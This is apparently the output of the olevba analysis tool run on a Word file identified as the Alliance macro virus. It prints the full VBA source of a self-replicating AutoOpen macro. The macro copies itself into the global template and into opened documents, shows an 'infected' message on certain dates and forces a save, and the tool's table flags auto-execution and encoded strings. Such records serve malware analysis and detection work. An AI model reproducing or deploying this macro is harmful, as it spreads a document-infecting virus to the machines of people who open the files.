olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alliance-65692663dbf398ba65c80c20b29f649b0ca30e9d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alliance-65692663dbf398ba65c80c20b29f649b0ca30e9d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Alliance-65692663dbf398ba65c80c20b29f649b0ca30e9d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next
Dim TagNummer
Dim MacName$
WordBasic.MacroCopy "autoopen", WordBasic.[FileName$]() + ":" + "autoopen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + "autoopen", "autoopen"
TagNummer = WordBasic.Day(WordBasic.Now())
Select Case TagNummer
    Case 11, 2, 7, 12
    
        If WordBasic.IsDocumentDirty() = -1 Then
            WordBasic.MacroCopy "Global:AutoOpen", MacName$
            MsgBox ("You Have Been Infected by the Alliance")
        End If
        WordBasic.FileSaveAs Format:=1
    
    Case Else
  End Select

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

